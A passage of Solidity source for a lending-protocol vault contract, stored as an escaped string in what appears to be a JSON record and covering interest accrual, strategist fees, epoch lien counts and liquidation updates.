lienSlope\n  ) internal virtual override {\n    VaultData storage s = _loadStorageSlot();\n\n    // increment slope for the new lien\n    _accrue(s);\n    unchecked {\n      uint48 newSlope = s.slope + lienSlope.safeCastTo48();\n      _setSlope(s, newSlope);\n    }\n\n    uint64 epoch = getLienEpoch(lienEnd);\n\n    _increaseOpenLiens(s, epoch);\n    emit LienOpen(lienId, epoch);\n  }\n\n  event SlopeUpdated(uint48 newSlope);\n\n  function accrue() public returns (uint256) {\n    return _accrue(_loadStorageSlot());\n  }\n\n  function _accrue(VaultData storage s) internal returns (uint256) {\n    unchecked {\n      s.yIntercept = (_totalAssets(s)).safeCastTo88();\n      s.last = block.timestamp.safeCastTo40();\n    }\n    emit YInterceptChanged(s.yIntercept);\n\n    return s.yIntercept;\n  }\n\n  /**\n   * @notice Computes the implied value of this PublicVault. This includes interest payments that have not yet been made.\n   * @return The implied value for this PublicVault.\n   */\n  function totalAssets()\n    public\n    view\n    virtual\n    override(ERC4626Cloned)\n    returns (uint256)\n  {\n    VaultData storage s = _loadStorageSlot();\n    return _totalAssets(s);\n  }\n\n  function _totalAssets(VaultData storage s) internal view returns (uint256) {\n    uint256 delta_t = block.timestamp - s.last;\n    return uint256(s.slope).mulDivDown(delta_t, 1) + uint256(s.yIntercept);\n  }\n\n  function totalSupply()\n    public\n    view\n    virtual\n    override(IERC20, ERC20Cloned)\n    returns (uint256)\n  {\n    return\n      _loadERC20Slot()._totalSupply +\n      _loadStorageSlot().strategistUnclaimedShares;\n  }\n\n  function claim() external {\n    require(msg.sender == owner()); //owner is \"strategist\"\n    VaultData storage s = _loadStorageSlot();\n    uint256 unclaimed = s.strategistUnclaimedShares;\n    s.strategistUnclaimedShares = 0;\n    _mint(msg.sender, unclaimed);\n  }\n\n  function beforePayment(BeforePaymentParams calldata params)\n    external\n    onlyLienToken\n  {\n    VaultData storage s = _loadStorageSlot();\n    _accrue(s);\n\n    unchecked {\n      uint48 newSlope = s.slope - params.lienSlope.safeCastTo48();\n      _setSlope(s, newSlope);\n    }\n    _handleStrategistInterestReward(s, params.interestOwed, params.amount);\n  }\n\n  function _setSlope(VaultData storage s, uint48 newSlope) internal {\n    s.slope = newSlope;\n    emit SlopeUpdated(newSlope);\n  }\n\n  function decreaseEpochLienCount(uint64 epoch) public onlyLienToken {\n    _decreaseEpochLienCount(_loadStorageSlot(), epoch);\n  }\n\n  function _decreaseEpochLienCount(VaultData storage s, uint64 epoch) internal {\n    s.epochData[epoch].liensOpenForEpoch--;\n    emit LiensOpenForEpochRemaining(\n      epoch,\n      s.epochData[epoch].liensOpenForEpoch\n    );\n  }\n\n  function getLienEpoch(uint64 end) public pure returns (uint64) {\n    return\n      uint256(Math.ceilDiv(end - uint64(START()), EPOCH_LENGTH()) - 1)\n        .safeCastTo64();\n  }\n\n  function getEpochEnd(uint256 epoch) public pure returns (uint64) {\n    return uint256(START() + (epoch + 1) * EPOCH_LENGTH()).safeCastTo64();\n  }\n\n  function _increaseOpenLiens(VaultData storage s, uint64 epoch) internal {\n    unchecked {\n      s.epochData[epoch].liensOpenForEpoch++;\n    }\n  }\n\n  function afterPayment(uint256 computedSlope) public onlyLienToken {\n    VaultData storage s = _loadStorageSlot();\n    unchecked {\n      s.slope += computedSlope.safeCastTo48();\n    }\n    emit SlopeUpdated(s.slope);\n  }\n\n  /**\n   * @notice After-deposit hook to update the yIntercept of the PublicVault to reflect a capital contribution.\n   * @param assets The amount of assets deposited to the PublicVault.\n   * @param shares The resulting amount of VaultToken shares that were issued.\n   */\n  function afterDeposit(uint256 assets, uint256 shares)\n    internal\n    virtual\n    override\n  {\n    VaultData storage s = _loadStorageSlot();\n\n    unchecked {\n      s.yIntercept += assets.safeCastTo88();\n    }\n    VIData storage v = _loadVISlot();\n    if (v.depositCap != 0 && totalAssets() >= v.depositCap) {\n      revert InvalidState(InvalidStates.DEPOSIT_CAP_EXCEEDED);\n    }\n    emit YInterceptChanged(s.yIntercept);\n  }\n\n  /**\n   * @dev Handles the dilutive fees (on lien repayments) for strategists in VaultTokens.\n   * @param interestOwing the owingInterest for the lien\n   * @param amount The amount that was paid.\n   */\n  function _handleStrategistInterestReward(\n    VaultData storage s,\n    uint256 interestOwing,\n    uint256 amount\n  ) internal virtual {\n    if (VAULT_FEE() != uint256(0)) {\n      uint256 x = (amount > interestOwing) ? interestOwing : amount;\n      uint256 fee = x.mulDivDown(VAULT_FEE(), 10000);\n      uint88 feeInShares = convertToShares(fee).safeCastTo88();\n      s.strategistUnclaimedShares += feeInShares;\n      emit StrategistFee(feeInShares);\n    }\n  }\n\n  function LIEN_TOKEN() public view returns (ILienToken) {\n    return ROUTER().LIEN_TOKEN();\n  }\n\n  function handleBuyoutLien(BuyoutLienParams calldata params)\n    public\n    onlyLienToken\n  {\n    VaultData storage s = _loadStorageSlot();\n\n    unchecked {\n      uint48 newSlope = s.slope - params.lienSlope.safeCastTo48();\n      _setSlope(s, newSlope);\n      s.yIntercept += params.increaseYIntercept.safeCastTo88();\n      s.last = block.timestamp.safeCastTo40();\n    }\n\n    _decreaseEpochLienCount(s, getLienEpoch(params.lienEnd.safeCastTo64()));\n    emit YInterceptChanged(s.yIntercept);\n  }\n\n  function updateAfterLiquidationPayment(\n    LiquidationPaymentParams calldata params\n  ) external onlyLienToken {\n    VaultData storage s = _loadStorageSlot();\n    if (params.remaining > 0)\n      _setYIntercept(s, s.yIntercept - params.remaining);\n  }\n\n  function updateVaultAfterLiquidation(\n    uint256 maxAuctionWindow,\n    AfterLiquidationParams calldata params\n  ) public onlyLienToken returns (address withdrawProxyIfNearBoundary) {\n    VaultData storage s = _loadStorageSlot();\n\n    _accrue(s);\n    unchecked {\n      _setSlope(s, s.slope - params.lienSlope.safeCastTo48());\n    }\n\n    if (s.currentEpoch != 0) {\n      transferWithdrawReserve();\n    }\n    uint64 lienEpoch = getLienEpoch(params.lienEnd);\n    _decreaseEpochLienCount(s, lienEpoch);\n\n    uint256 timeToEnd = timeToEpochEnd(lienEpoch);\n    if (timeToEnd < maxAuctionWindow) {\n      _deployWithdrawProxyIfNotDeployed(s, lienEpoch);\n      withdrawProxyIfNearBoundary = s.epochData[lienEpoch].withdrawProxy;\n\n      WithdrawProxy(withdrawProxyIfNearBoundary).handleNewLiquidation(\n        params.newAmount,\n        maxAuctionWindow\n      );\n    }\n  }\n\n  function increaseYIntercept(uint256 amount) public {\n    VaultData storage s = _loadStorageSlot();\n    uint64 currentEpoch = s.currentEpoch;\n    require(\n      currentEpoch != 0 &&\n        msg.sender == s.epochData[currentEpoch - 1].withdrawProxy\n    );\n    _setYIntercept(s, s.yIntercept + amount);\n  }\n\n  modifier onlyLienToken() {\n    require(msg.sender == address(LIEN_TOKEN()));\n    _;\n  }\n\n  function decreaseYIntercept(uint256 amount) public {\n    VaultData storage s = _loadStorageSlot();\n    uint64 currentEpoch = s.currentEpoch;\n    require(\n      currentEpoch != 0 &&"
    }
  ]
}